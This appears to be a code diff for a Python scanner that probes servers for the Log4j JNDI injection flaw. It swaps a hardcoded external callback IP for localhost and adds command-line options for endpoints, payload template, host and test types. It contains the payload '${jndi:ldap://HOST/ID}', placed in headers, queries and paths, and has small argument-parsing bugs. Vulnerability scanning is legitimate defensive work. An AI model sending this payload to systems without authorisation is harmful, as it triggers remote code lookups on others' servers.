@@ -2,19 +2,54 @@ import argparse
 import uuid
 import tests
 
-TESTING_HOST = "141.94.246.79:1389"
+TESTING_HOST = "localhost:1389"
 TESTING_PAYLOAD = "${jndi:ldap://HOST/ID}"
 OUTPUT_FILE = "ids.csv"
 TESTS_LIST = [("Headers", tests.test_header),
-              ("GET", tests.test_get),
+              ("Query", tests.test_get),
               ("Path", tests.test_path)]
 
 
 def get_arguments():
     parser = argparse.ArgumentParser()
-    parser.add_argument("filename", help="path to the file with server:ip to test")
+    group = parser.add_mutually_exclusive_group(required=True)
+    group.add_argument("-f", "--filename",
+                       action="store",
+                       type="open")
+    group.add_argument("-e", "--endpoint",
+                       action="store")
+    parser.add_argument("--http",
+                        action="store_true")
+    parser.add_argument("--https",
+                        action="store_true")
+    parser.add_argument("-p", "--payload",
+                        action="store",
+                        default=TESTING_PAYLOAD,
+                        help="template of the testing payload to use")
+    parser.add_argument("-h", "--host",
+                        action="store",
+                        default=TESTING_HOST)
+    parser.add_argument("-o", "--output",
+                        action="store",
+                        default=None,
+                        help="output file on which will be saved the endpoint-ID mappings",
+                        type=argparse.FileType('w'))
+    parser.add_argument("--headers",
+                        action="append_const",
+                        dest="tests",
+                        const="Headers")
+    parser.add_argument("--query",
+                        action="append_const",
+                        dest="tests",
+                        const="Query")
+    parser.add_argument("--path",
+                        action="append_const",
+                        dest="tests",
+                        const="Path")
     args = parser.parse_args()
-    return args.filename
+    if args.tests is None:
+        args.tests = ["Headers", "Query", "Path"]
+    return args
 
 
 def get_entries(filename):
